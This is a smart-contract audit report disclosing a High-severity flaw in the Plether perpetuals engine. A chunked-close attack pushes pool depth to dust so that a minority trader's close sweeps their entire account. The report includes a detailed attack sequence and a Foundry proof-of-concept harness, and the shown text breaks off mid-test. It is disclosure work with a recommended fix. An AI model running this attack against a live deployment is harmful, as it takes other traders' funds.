# \#99393 [SC-High] Close VPI at a dust pool depth takes a minority-side trader's whole clearinghouse account, including idle collateral

**Submitted on Nov 13th 2026 at 13:39:28 UTC by @Abhan for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99393
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Temporary freezing of funds for at least 24 hours

## Description

## Brief/Intro
The fresh VPI charged on a voluntary close is `0.5 · k · (postSkew² − preSkew²) / depth`, where depth is pool cash net of trader claims. Its only safeguard is an exact `depth == 0` check, and nothing caps the charge relative to the closed notional. A full close collects that charge from the position's gain, then from the account's idle free settlement balance, then from released margin, and waives only what is left. When the pool is in deficit, a winning trader can partial-close in chunks sized just under the remaining pool cash. Each chunk is paid in cash, so no claim is created, and depth ends at a few dollars instead of zero, which avoids the zero-depth exemption. Any minority-side close that executes in that state is charged far more than the account holds. In the PoC, which uses release parameters, the production router and only Pyth and USDG mocks, an honest SHORT whose close would net **+1,549.47 USDG** at normal depth instead loses its **entire 59,978.07 USDG account**, of which 54,999.80 USDG was idle collateral that never backed the position. The attacker then withdraws **59,995.90 USDG more** than in the same run without the victim. A victim that bounds its action charge to protect itself cannot close at all, and its idle collateral stays frozen for as long as the engine is degraded.

## Vulnerability Details
`CloseAccountingLib.buildCloseState` skips fresh VPI only when depth is exactly zero:

```solidity
// CloseAccountingLib.sol L105-L111
// With no economic depth, keep protective exits live without creating a fresh charge or rebate.
// The lifetime clamp below still recovers any previously received negative VPI.
if (inputs.poolDepthAssets != 0) {
    state.vpiDeltaAssets = CfdMath.calculateVPI(
        inputs.preSkewAssets, inputs.postSkewAssets, inputs.poolDepthAssets, inputs.vpiFactor
    );
}
```

The depth is pool assets net of trader claims at execution time:

```solidity
// CfdEnginePlanLib.sol L1339-L1341
poolDepthAssets: PositionRiskAccountingLib.computeNetPoolDepthAssets(
    snap.poolAssets, snap.totalTraderClaimBalanceAssets
),
```

`CfdMath.tryGetSkewCost` divides the squared skew by that depth. It also returns 0 only for a depth of exactly 0:

```solidity
// CfdMath.sol L123-L139
if (depthAssets == 0 || skewAssets == 0) {
    return (true, 0);
}
...
uint256 sqSkewOverDepthWad = (skewWad * skewWad) / depthWad;
...
uint256 costWad = (vpiFactorWad * sqSkewOverDepthWad) / WAD / 2;
return (true, costWad / 1e12);
```

So the charge is zero at a depth of 0 and grows without limit as depth falls toward 1 atom. Nothing caps it relative to the closed notional or the position's margin. Carry handles the same input safely: `PositionRiskAccountingLib.computeBorrowUtilizationBps` caps utilization at 100% and treats zero depth as full utilization, so carry stays bounded. VPI has no equivalent cap.

When the close's action charge is positive, `_planCloseActionSettlement` first withholds the price gain. `_planCloseCashSources` then collects the rest from the spendable action reserve, then from all of the account's free settlement balance, then from released margin and, on a full close, from committed order margin. Whatever is still uncollected is waived:

```solidity
// CfdEnginePlanLib.sol L1111-L1133 (_planCloseCashSources)
uint256 collectibleFreeSettlementAssets = snap.accountBuckets.freeSettlementAssets + releasedVpiReserveAssets;
...
uint256 freeConsumedAssets = actionChargeAfterReserveAssets < collectibleFreeSettlementAssets
    ? actionChargeAfterReserveAssets
    : collectibleFreeSettlementAssets;
uint256 actionChargeAfterFreeAssets = actionChargeAfterReserveAssets - freeConsumedAssets;
delta.actionChargeFromReleasedMarginAssets = actionChargeAfterFreeAssets < delta.unlockMarginAssets
    ? actionChargeAfterFreeAssets
    : delta.unlockMarginAssets;
...
delta.actionChargeWaivedAssets = delta.actionChargeToCollectAssets - delta.actionChargeCollectedAssets;
```

Any close that increases skew, which means any close on the minority side, can therefore take the trader's entire clearinghouse balance, including collateral that never backed the position.

When the pool is in deficit, a winning trader can push depth into this range without setting it to zero. `CfdEngine._payOrRecordTraderClaim` pays a close payout in cash only if it fits under pool cash net of claims. Otherwise it records the whole payout as a claim:

```solidity
// CfdEngine.sol L849-L856
if (_canPayFreshPoolPayout(amountAssets)) {
    _payTraderClaim(account, amountAssets, positionRemainsOpen);
} else {
    _advanceAllCarryIndexes(block.timestamp);
    traderClaimBalanceAssets[account] += amountAssets;
    totalTraderClaimBalanceAssets += amountAssets;
    emit TraderClaimRecorded(account, amountAssets);
}
```

A single close larger than pool cash would create a claim that sets depth to exactly 0 and switches the charge off. A winner whose profit exceeds pool cash avoids this by closing in chunks, each sized just under the cash left. Each chunk is paid in cash into the winner's own PnL pledge, no claim is created, and after a few chunks pool cash is a few dollars while depth is still non-zero. This state persists until new cash reaches the pool, so every minority close that executes during it is affected.

The victim also cannot step aside. While the engine is degraded, `CfdEngineSettlementSidecar.validateWithdraw` (L255-L275) reverts any withdrawal from an account that still has an open position. `CfdEngine.clearDegradedMode` (L658-L667) succeeds only when pool cash net of claims covers the full maximum liability, so the owner must recapitalize the entire deficit first. A trader who sets a sensible `maxActionChargeAssets` bound on the close is protected from the sweep, but the close then never executes and the idle balance cannot be withdrawn. A trader who does not set a bound loses the whole account.

The concrete attack runs as follows. The pool must first be in deficit, meaning a LONG winner (the attacker) is owed more than pool cash. The PoC reaches this through production entrypoints only. LPs fund the pool, a large SHORT opens at 1.00, exiting LPs redeem down to the settlement buffer, and the basket rises to 1.90. Two LONGs are admitted at 1.90, the SHORT winner closes (latching degraded mode), and the basket returns to 1.40. Pool cash is then 111,125.96 USDG.

The victim is an honest minority SHORT. It holds 5,000 tokens opened at 1.00 with 4,973.27 USDG of margin, plus 54,999.80 USDG of idle free settlement in the clearinghouse. At 1.40 its position is about 2,000 USDG in profit.

The attacker commits three partial closes of its LONG, sized off-chain by simulation. The victim commits its full close right after them, while depth is still 111,125.96 USDG. The keeper executes the queue in FIFO order. Each attacker chunk is paid in cash, so when the victim's close executes, depth is 62.68 USDG with no claims outstanding.

Closing a minority SHORT increases skew, so the VPI charge is positive and enormous. The planner withholds the 2,000 gain, consumes the 54,999.80 idle balance and the released margin, and waives the rest. The victim ends with 0 USDG and no claim, and pool cash rises from 62.68 to 60,040.75 USDG. The attacker then repeats its chunked partial closes, which now pay out the victim's money, closes the remainder and withdraws as a flat account.

The queue ordering only shows that a victim who committed at a normal depth cannot protect itself. Because the dust state persists, any unbounded minority close that executes after the drain is swept in the same way.

A deficit is not the only way for depth to fall far below skew. LP redemptions stop at maximum liability plus the settlement buffer, not at skew, and a SHORT's maximum liability per token (cap minus entry price) shrinks as the basket rises. In a pool that is not degraded and has no trader claims, with a 2,000,000-token SHORT opened at 1.80 and the LP redeemed to its limit, depth is 416,755.63 USDG against a skew of about 3.4 million. An honest minority LONG of 180,000 USDG notional with 3,600 USDG of margin then pays 15,827.63 USDG (8.79% of notional) to close at an unchanged price, more than four times its margin, and the excess comes out of its idle balance. The same close costs 703.45 USDG before the LP leaves. No attacker or ordering is involved.

## Impact Details
A third party's funds are taken directly. The victim loses its whole account of 59,978.07 USDG, including 54,999.80 USDG of idle collateral that was never at risk on the position. In the same state it could have closed for +1,549.47 USDG and withdrawn 61,527.53 USDG. The confiscated cash goes into the pool, and the winner who created the dust depth then withdraws it. The attacker's realized cash is 171,059.18 USDG, against 111,063.28 USDG in the same run without the victim, an increase of 59,995.90 USDG. Its outstanding claim falls by the same amount (from 109,882.26 to 49,886.36), and total system value is conserved exactly. The victim's funds turn the attacker's unbacked claim, which cannot be settled until the whole deficit is covered, into withdrawable cash.

A victim that protects itself with a reasonable charge bound has its funds frozen instead. A close bounded at 1,000 USDG (about 14% of its 7,000 USDG notional) does not execute at dust depth. The 54,999.80 USDG idle balance stays unwithdrawable seven days later, and the owner's `clearDegradedMode` reverts with `StillInsolvent` until the whole deficit is recapitalized, which nothing obliges the owner to do. This is the in-scope High impact "Temporary freezing of funds for at least 24 hours".

No attacker is strictly needed for a smaller loss. Rational winners in a deficit pool chunk their closes anyway, because chunking turns claims into cash. The same victim close gives +1,443.06 USDG at depth 77,018, +893.03 at 29,777, −664.27 at 10,881 and −2,238.18 at 6,629, compared with +1,549.47 at full depth. In the non-degraded form above, the minority close costs 8.79% of notional at a basket of 1.80, 2.88% at 1.50 and 0.98% at 1.00.

The precondition is a pool in deficit, reached in the PoC by a basket path of 1.00 → 1.90 → 1.40. Under the program rules, feasibility limits affect the payout, not the severity.

## Recommendation

Bound the fresh positive VPI on a close so that it never exceeds what the curve would charge at a depth equal to the current skew, for example by using `max(depth, preSkew)` as the close VPI denominator or by capping a positive close charge at about `vpiFactor` times the closed notional. This leaves VPI unchanged in normal pools, removes the 0-versus-1-atom discontinuity, and also covers the non-degraded case. Independently, limit a voluntary close's action charge to the position's own gain and margin, so that a pricing error can never reach collateral that did not back the position.

## References
Fresh close VPI is skipped only at exactly zero depth: [CloseAccountingLib.sol#L105-L111](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol?plain=1#L105-L111)

Skew cost is divided by depth with no cap: [CfdMath.sol#L118-L140](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdMath.sol?plain=1#L118-L140)

Close depth is pool assets net of claims: [CfdEnginePlanLib.sol#L1339-L1341](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol?plain=1#L1339-L1341)

The close charge is collected from free settlement, released margin and committed margin: [CfdEnginePlanLib.sol#L1036-L1134](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CfdEnginePlanLib.sol?plain=1#L1036-L1134)

A payout is paid in cash if it fits, otherwise it is recorded in full as a claim: [CfdEngine.sol#L840-L871](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol?plain=1#L840-L871)

Withdrawal is blocked while degraded with an open position: [CfdEngineSettlementSidecar.sol#L255-L275](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol?plain=1#L255-L275)

Degraded mode is cleared only after the full deficit is covered: [CfdEngine.sol#L658-L667](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngine.sol?plain=1#L658-L667)


## Proof of Concept

## Proof of Concept

The vulnerability is demonstrated by a runnable Foundry test against the audit repository, `immunefi-team/audit-comp-plether` at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The complete test code is included at the end of this section.

The test extends the repository's own `BasePerpTest` harness (`packages/perps/test/perps/BasePerpTest.sol`) and does not modify any contract under `src/`. The only mocks are the repository's Pyth and USDG test contracts. `BasePerpTest` deploys the repository's `LegacyOrderRouterHarness`, which inherits the production `OrderRouter` unchanged and only adds a test-only scalar commit overload that this test never calls. Every trade goes through the production V3 entry point `IPerpsTraderActions.commitOrder(OrderRequest)` and is executed by an arbitrary keeper address. Every LP deposit and redemption uses the public request → `router.settleLpEpoch` → claim flow. Mark refreshes go through the permissionless `router.updateMarkPrice`. No protocol contract is impersonated.

The test applies the release parameters from `DEPLOYMENT.md`: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4, 4 bps execution fee, 20/10 bps margins, 25 bps settlement buffer, 2,500 bps adverse multiplier, Senior cap 40M/80% and 1 USDG seeds.

### Step-by-step (`test_Attack_VictimAccountSweptAtDustDepth`)

**Setup.** LPs deposit 500,000 Junior and 2,000,000 Senior through the public flow. At 1.00, a SHORT of 985,000 tokens opens, and the victim opens a 5,000-token SHORT with 5,000 USDG margin and keeps 55,000 USDG idle in the clearinghouse. Exiting LPs redeem down to the settlement buffer.

**Deficit.** The basket moves to 1.90. The attacker's LONG (88% of pool cash in maximum profit) and another LONG are admitted, the SHORT winner closes and degraded mode latches. The basket returns to 1.40. The attacker's profit now exceeds pool cash of 111,125.96 USDG, and there are no trader claims.

**Queue.** The attacker commits three partial closes sized just under the pool cash left at each step. The victim then commits its full close while depth is still 111,125.96 USDG.

**Execution.** The keeper executes the FIFO queue. After the three chunks, depth is 62.68 USDG with zero claims. The victim's close executes, and its account goes from 59,978.07 USDG to exactly 0, with no claim recorded. Pool cash rises to 60,040.75 USDG.

**Cash-out.** The attacker drains the pool again in chunks, closes the rest and withdraws. Its realized cash is 171,059.18 USDG, against 111,063.28 USDG in a control run from the same snapshot in which the victim does not close: **+59,995.90 USDG**. Its remaining claim is 49,886.36 against 109,882.26 in the control. Total system value is unchanged.

### Other scenarios covered by the test

`test_Control_VictimClosesAtNormalDepthAndWithdraws` runs the same state with no chunks ahead of the victim. The victim nets +1,549.47 USDG on its close and withdraws 61,527.53 USDG even though the engine is degraded.

`test_BoundedVictim_CannotCloseAndIdleCollateralFrozen` sets the victim's `maxActionChargeAssets` to 1,000 USDG. The bounded close executes at normal depth. At dust depth it does not execute, the 54,999.80 USDG idle balance is still unwithdrawable 7 days later, and the owner's `clearDegradedMode` reverts.

`test_ChargeVsDepth_NoAttacker` runs the same victim close at the depths a chunking winner passes through. The close returns +1,443.06 USDG at a depth of 77,018, +893.03 at 29,777, −664.27 at 10,881 and −2,238.18 at 6,629.

`test_CloseCostAtLpRedemptionLimit_GrowsWithBasket` covers a pool with no deficit, no claims and no degraded mode, where the LP redeems to its limit. The minority close then costs 0.98% of notional at a basket of 1.00, 2.88% at 1.50 and 8.79% at 1.80, where it pays 15,827.63 USDG against 703.45 USDG before the LP leaves.

### How to run

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git
cd audit-comp-plether
git checkout a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive
mkdir -p packages/perps/test/poc
# save the test code below as packages/perps/test/poc/DustDepthCloseVpi.t.sol
cd packages/perps
FOUNDRY_TEST=test/poc FOUNDRY_SCRIPT=test/poc forge test --match-path test/poc/DustDepthCloseVpi.t.sol -vv
```

The two `FOUNDRY_*` variables limit compilation to the PoC. The package builds with via-IR, so compiling its whole test suite takes much longer; running without them also works. Expected result: `5 tests passed, 0 failed, 0 skipped` across the two suites, with the values above in the logs.

### PoC code

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IPerpsTraderActions} from "@plether/perps/interfaces/IPerpsTraderActions.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Shared harness. Release parameters from packages/perps/DEPLOYMENT.md. Every trade goes through the
///         production V3 `IPerpsTraderActions.commitOrder(OrderRequest)` and is executed by an untrusted keeper
///         address. Every LP deposit and redemption uses the public request -> `router.settleLpEpoch` -> claim flow.
///         Pyth and USDG are the only mocks. No contract under src/ is modified or impersonated.
abstract contract DustDepthHarness is BasePerpTest {

    address internal constant KEEPER = address(0xBEEF);

    uint256 internal constant ONE = 1e8; // basket 1.00
    uint256 internal constant LOT = 1e20; // positionSizeQuantum: 100 synthetic tokens

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialSeniorSeedDeposit() internal pure override returns (uint256) {
        return 1e6;
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public virtual override {
        super.setUp();
        _setSeniorCapacity(40_000_000e6, 8000);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        // The admin timelocks above end inside a weekend closure; resume on the next Monday 10:00 UTC.
        vm.warp(SETUP_TIMESTAMP + 7 days);
        vm.roll(vm.getBlockNumber() + 10);
        assertFalse(engine.isOracleFrozen(), "regular trading hours");
        assertFalse(engine.isFadWindow(), "not FAD");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(engine.settlementBufferBps(), 25, "release settlement buffer");
        assertEq(pool.maxSeniorShareBps(), 8000, "release Senior share cap");
        assertEq(router.pletherOracle().adverseConfidenceMultiplierBps(), 2500, "release adverse multiplier");
    }

    // ------------------------------------------------------------------------------------------------------------
    // Oracle and keeper
    // ------------------------------------------------------------------------------------------------------------

    /// @dev One block / one second later, every basket feed is published at `price` with zero confidence.
    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(price)),
            0,
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    /// @dev Permissionless mark refresh.
    function _mark(
        uint256 price
    ) internal {
        bytes[] memory data = _pyth(price);
        vm.prank(KEEPER);
        router.updateMarkPrice(data);
    }

    /// @dev Untrusted keeper executes the FIFO head order.
    function _exec(
        uint256 price
    ) internal {
        bytes[] memory data = _pyth(price);
        uint64 head = router.nextExecuteId();
        vm.prank(KEEPER);
        router.executeOrder(head, data);
    }

    function _settle(
        uint256 price
    ) internal {
        bytes[] memory data = _pyth(price);
        vm.prank(KEEPER);
        router.settleLpEpoch(data);
    }

    // ------------------------------------------------------------------------------------------------------------
    // Traders
    // ------------------------------------------------------------------------------------------------------------

    /// @dev `maxActionChargeAssets` is the user's bound on VPI + fees for this order (type(uint256).max = no bound).
    function _request(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 maxActionCharge
    ) internal view returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        // LONG profits when the basket falls: an open needs price >= target, a close price <= target (SHORT mirrored).
        uint256 target = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode(account, router.nextCommitId())),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: target,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: maxActionCharge,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _commit(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose,
        uint256 maxActionCharge
    ) internal returns (uint64 orderId) {
        OrderV3Types.OrderRequest memory request = _request(account, side, size, margin, isClose, maxActionCharge);
        vm.prank(account);
        orderId = IPerpsTraderActions(address(router)).commitOrder(request);
    }

    function _openPosition(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price
    ) internal {
        uint256 before = _size(account);
        _commit(account, side, size, margin, false, type(uint256).max);
        _exec(price);
        assertEq(_size(account), before + size, "open executed");
    }

    function _closePosition(
        address account,
        uint256 size,
        uint256 price
    ) internal {
        uint256 before = _size(account);
        _commit(account, _side(account), size, 0, true, type(uint256).max);
        _exec(price);
        assertEq(_size(account), before - size, "close executed");
    }

    function _size(
        address account
    ) internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(account);
    }

    function _side(
        address account
    ) internal view returns (CfdTypes.Side side) {
        (,,,, side,,) = engine.positions(account);
    }

    /// @dev Clearinghouse balance + wallet USDG + trader claim.
    function _wealth(
        address account
    ) internal view returns (uint256) {
        return clearinghouse.balanceAssets(account) + settlementToken.balanceOf(account)
            + engine.traderClaimBalanceAssets(account);
    }

    function _withdrawAll(
        address account
    ) internal returns (uint256 amount, bool ok) {
        amount = clearinghouse.getFreeBuyingPowerAssets(account);
        vm.prank(account);
        (ok,) = address(clearinghouse).call(abi.encodeCall(clearinghouse.withdraw, (account, amount)));
    }

    /// @dev VPI depth used by the engine: pool assets net of trader claims.
    function _depth() internal view returns (uint256) {
        uint256 cash = pool.totalAssets();
        uint256 claims = engine.totalTraderClaimBalanceAssets();
        return cash > claims ? cash - claims : 0;
    }

    // ------------------------------------------------------------------------------------------------------------
    // LPs
    // ------------------------------------------------------------------------------------------------------------

    function _lpDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount,
        uint256 price
    ) internal {
        _mark(price);
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(vault), amount);
        uint256 requestId = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
        vm.warp(vault.depositEpochStart(requestId));
        _settle(price);
        assertEq(vault.claimableDepositRequest(requestId, lp), amount, "deposit activated in full");
        vm.prank(lp);
        vault.claimDeposit(requestId, amount, lp, lp);
    }

    function _lpRedeem(
        TrancheVault vault,
        address lp,
        uint256 shares,
        uint256 price
    ) internal {
        _mark(price);
        vm.prank(lp);
        uint256 requestId = vault.requestRedeem(shares, lp, lp);
        vm.warp(vault.depositEpochStart(requestId));
        _settle(price);
        uint256 claimable = vault.claimableRedeemRequest(requestId, lp);
        if (claimable != 0) {
            vm.prank(lp);
            vault.claimRedeem(requestId, claimable, lp, lp);
        }
    }

    // ------------------------------------------------------------------------------------------------------------
    // Logging (6-decimal USDG)
    // ------------------------------------------------------------------------------------------------------------

    function _usd(
        string memory label,
        int256 v
    ) internal pure {
        uint256 abs = v < 0 ? uint256(-v) : uint256(v);
        string memory frac = vm.toString(abs % 1e6);
        while (bytes(frac).length < 6) {
            frac = string.concat("0", frac);
        }
        console2.log(string.concat(label, ": ", v < 0 ? "-" : "", vm.toString(abs / 1e6), ".", frac));
    }

    function _usd(
        string memory label,
        uint256 v
    ) internal pure {
        _usd(label, int256(v));
    }

}

/// @title Close VPI at dust pool depth takes a minority-side closer's whole account, including idle collateral
/// @notice The pool is first brought into deficit through production entrypoints only (basket 1.00 -> 1.90 -> 1.40).
///         A LONG winner (ATTACKER) whose profit exceeds pool cash then partial-closes in chunks sized just under
///         the cash left, so each chunk is paid in cash and no trader claim is created. Pool depth ends at a few
///         dollars but not zero, so the zero-depth VPI exemption does not apply. An honest minority SHORT (VICTIM)
///         whose close was committed while depth was normal executes behind those chunks in the FIFO queue. Its
///         close VPI is charged against the dust depth and is collected from its gain, its margin and its idle free
///         settlement balance.
contract DustDepthCloseVpiTest is DustDepthHarness {

    address internal constant SHORT_WHALE = address(0xA77A); // honest SHORT that wins at 1.90 and leaves
    address internal constant ATTACKER = address(0xA77B); // LONG admitted at 1.90, in profit at 1.40
    address internal constant OTHER_LONG = address(0x71C7); // honest LONG admitted at 1.90
    address internal constant VICTIM = address(0x3140); // honest minority SHORT with idle collateral
    address internal constant LP_S = address(0x5E1); // Senior LP that stays
    address internal constant LP_J = address(0xB0B); // Junior LP that stays
    address internal constant LP_X = address(0xE417); // LPs that redeem down to the settlement buffer

    uint256 internal constant P_HIGH = 1.9e8;
    uint256 internal constant PX = 1.4e8; // basket when the attack runs
    uint256 internal constant PROFIT_PER_LOT = 50e6; // ATTACKER LONG: (1.90 - 1.40) * 100 tokens

    uint256 internal victimSize;

    function setUp() public override {
        super.setUp();

        // 1. LPs fund the pool: Junior 500k, Senior 2M.
        _lpDeposit(juniorVault, LP_J, 200_000e6, ONE);
        _lpDeposit(juniorVault, LP_X, 300_000e6, ONE);
        _lpDeposit(seniorVault, LP_S, 800_000e6, ONE);
        _lpDeposit(seniorVault, LP_X, 1_200_000e6, ONE);

        // 2. At 1.00 a large SHORT opens, and VICTIM opens a small SHORT (5,000 tokens, 5,000 USDG margin) and keeps
        //    55,000 USDG of idle collateral in the clearinghouse.
        _fundTrader(SHORT_WHALE, 100_000e6);
        _openPosition(SHORT_WHALE, CfdTypes.Side.SHORT, 9850 * LOT, 20_000e6, ONE);
        _fundTrader(VICTIM, 60_000e6);
        victimSize = 50 * LOT;
        _openPosition(VICTIM, CfdTypes.Side.SHORT, victimSize, 5000e6, ONE);

        // 3. Exiting LPs redeem down to the settlement buffer (after the deposit cooldown).
        vm.warp(vm.getBlockTimestamp() + 1 hours);
        _lpRedeem(seniorVault, LP_X, seniorVault.balanceOf(LP_X), ONE);
        _lpRedeem(juniorVault, LP_X, juniorVault.balanceOf(LP_X) * 97 / 100, ONE);
        _mark(ONE);
        assertFalse(engine.degradedMode(), "not degraded yet");

        // 4. Basket rises to 1.90. Two LONGs are admitted, the SHORT winner closes and degraded mode latches.
        _fundTrader(ATTACKER, 400_000e6);
        _fundTrader(OTHER_LONG, 100_000e6);
        _mark(P_HIGH);
        uint256 cash = pool.totalAssets();
        _openPosition(ATTACKER, CfdTypes.Side.LONG, ((cash * 88 / 100) / P_HIGH) * LOT, 300_000e6, P_HIGH);
        _openPosition(OTHER_LONG, CfdTypes.Side.LONG, ((cash * 8 / 100) / P_HIGH) * LOT, 50_000e6, P_HIGH);
        _closePosition(SHORT_WHALE, _size(SHORT_WHALE), P_HIGH);
        assertTrue(engine.degradedMode(), "degraded after the SHORT winner left");

        // 5. Basket returns to 1.40. ATTACKER's profit now exceeds pool cash; VICTIM's SHORT is ~2,000 USDG in profit.
        _mark(PX);
        assertGt(_size(ATTACKER) / LOT * PROFIT_PER_LOT, pool.totalAssets(), "attacker profit exceeds pool cash");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no trader claims yet");
    }

    // ------------------------------------------------------------------------------------------------------------
    // Attacker chunking
    // ------------------------------------------------------------------------------------------------------------

    /// @dev One partial close sized just under the pool cash left, so it is paid in cash and creates no claim.
    function _drainChunk(
        uint256 leaveLots
    ) internal returns (uint256 lots) {
        lots = pool.totalAssets() / PROFIT_PER_LOT - leaveLots;
        uint256 maxLots = _size(ATTACKER) / LOT - 1;
        if (lots > maxLots) {
            lots = maxLots;
        }
        uint256 claimBefore = engine.traderClaimBalanceAssets(ATTACKER);
        _closePosition(ATTACKER, lots * LOT, PX);
        assertEq(engine.traderClaimBalanceAssets(ATTACKER), claimBefore, "chunk paid in cash, no claim");
    }

    function _drainToDust() internal {
        while (pool.totalAssets() >= 2 * PROFIT_PER_LOT && _size(ATTACKER) > LOT) {
            _drainChunk(0);
        }
    }

    /// @dev Off-chain sizing of the chunks (simulated on a snapshot, then reverted).
    function _plannedChunks() internal returns (uint256[] memory chunks) {
        uint256 snap = vm.snapshotState();
        uint256[] memory tmp = new uint256[](16);
        uint256 n;
        while (pool.totalAssets() >= 2 * PROFIT_PER_LOT && _size(ATTACKER) > LOT) {
            tmp[n++] = _drainChunk(0);
        }
        vm.revertToState(snap);
        chunks = new uint256[](n);
        for (uint256 i; i < n; ++i) {
            chunks[i] = tmp[i];
        }
    }

    /// @dev ATTACKER's chunks are committed first, VICTIM's close right after, while depth is still normal.
    function _queueChunksAheadOfVictim(
        uint256 victimMaxActionCharge
    ) internal returns (uint256 n) {
        uint256[] memory chunks = _plannedChunks();
        n = chunks.length;
        for (uint256 i; i < n; ++i) {
            _commit(ATTACKER, CfdTypes.Side.LONG, chunks[i] * LOT, 0, true, type(uint256).max);
        }
        _commit(VICTIM, CfdTypes.Side.SHORT, victimSize, 0, true, victimMaxActionCharge);
    }

    /// @dev ATTACKER takes the remaining pool cash in chunks, closes the rest and withdraws as a flat account.
    ///      `before` is ATTACKER's clearinghouse balance + wallet measured before any chunk executed.
    function _attackerExit(
        uint256 before
    ) internal returns (uint256 cashOut, uint256 claimLeft) {
        _drainToDust();
        _closePosition(ATTACKER, _size(ATTACKER), PX);
        (, bool ok) = _withdrawAll(ATTACKER);
        assertTrue(ok, "flat attacker withdraws while degraded");
        cashOut = clearinghouse.balanceAssets(ATTACKER) + settlementToken.balanceOf(ATTACKER) - before;
        claimLeft = engine.traderClaimBalanceAssets(ATTACKER);
    }

    /// @dev Pool cash net of claims plus every account's balance, wallet and claim. USDG is never minted or burned
    ///      by the protocol, so this is constant across trader and keeper actions.
    function _systemValue() internal view returns (int256 v) {
        address[6] memory accts = [SHORT_WHALE, ATTACKER, OTHER_LONG, VICTIM, KEEPER, engine.protocolTreasury()];
        v = int256(pool.totalAssets()) - int256(engine.totalTraderClaimBalanceAssets());
        for (uint256 i; i < accts.length; ++i) {
            v += int256(_wealth(accts[i]));
        }
    }

    // ------------------------------------------------------------------------------------------------------------
    // Tests
    // ------------------------------------------------------------------------------------------------------------

    /// @notice Control. With no chunking ahead of it, VICTIM closes at a profit and withdraws everything, even though
    ///         the engine is degraded.
    function test_Control_VictimClosesAtNormalDepthAndWithdraws() public {
        uint256 before = _wealth(VICTIM);
        _usd("pool depth", _depth());
        _usd("victim position margin (pledge)", clearinghouse.pnlPledgeAssets(VICTIM));
        _usd("victim idle free settlement", clearinghouse.getFreeBuyingPowerAssets(VICTIM));
        _usd("victim account before close", before);

